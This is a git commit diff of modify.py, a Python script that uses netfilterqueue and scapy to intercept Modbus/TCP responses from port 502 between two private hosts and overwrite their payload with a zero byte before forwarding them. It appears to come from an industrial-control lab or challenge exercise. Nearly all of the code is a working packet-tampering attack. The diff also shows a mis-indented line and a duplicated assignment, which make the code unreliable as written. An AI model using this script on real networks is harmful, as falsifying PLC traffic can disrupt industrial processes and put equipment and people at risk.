154c1a0c3eb0e981ccf280d9e4df8bee68fa6b3b
wadfx95174 <wadfx95174@gmail.com>
2020-10-27 17:52:38 +0800

    seven floor(done)

--- modify.py
+++ modify.py
@@ -1,27 +1,33 @@
-from netfilterqueue import NetfilterQueue
+import netfilterqueue
 from scapy.all import *
+import struct
+
 print("start")
 def processPacket(packet):
+
     pkt = IP(packet.get_payload())
     print (pkt.show())
     
-    if (pkt.haslayer(TCP) and pkt[TCP].flags=='PA' and pkt.getlayer(IP).dst == '192.168.2.101'):
-        print('+')
-        print (pkt[Raw].load)
-        pkt[Raw].load = pkt[Raw].load[:9] + b'\x0a\xb2\x0a\x01\x10\x85'
-        print (pkt[Raw].load)
-        print('-')
-        del pkt[IP].len
+    if (pkt.haslayer(TCP) and pkt[TCP].flags=='PA' and pkt.getlayer(IP).src == '172.16.100.200' and pkt.getlayer(IP).dst == '172.16.100.100' and pkt.getlayer(TCP).sport == 502):
+       # print('+')
+       # print (pkt[Raw].load)
+       # pkt[Raw].load = pkt[Raw].load[:9] + b'\x0a\xb2\x0a\x01\x10\x85'
+       # print (pkt[Raw].load)
+       # print('-')
+       # del pkt[IP].len
+        pkt[Raw].load = pkt[Raw].load[:9] + b'\x00'
         del pkt[IP].chksum
         del pkt[TCP].chksum
+        pkt[Raw].load = pkt[Raw].load[:9] + b'\x00'
         packet.set_payload(bytes(pkt))
-        print('pkt================================')
-        print (pkt.show())
-        # print('packet==================================')
-        # print (IP(packet.get_payload()).show())
-        print('====================================')
+       print ("test")
+       # print (pkt.show())
     packet.accept()
 
-queue = NetfilterQueue()
+queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, processPacket)
-queue.run()
+try:
+    queue.run()
+except KeyboardInterrupt:
+    print("end")
+queue.unbind()
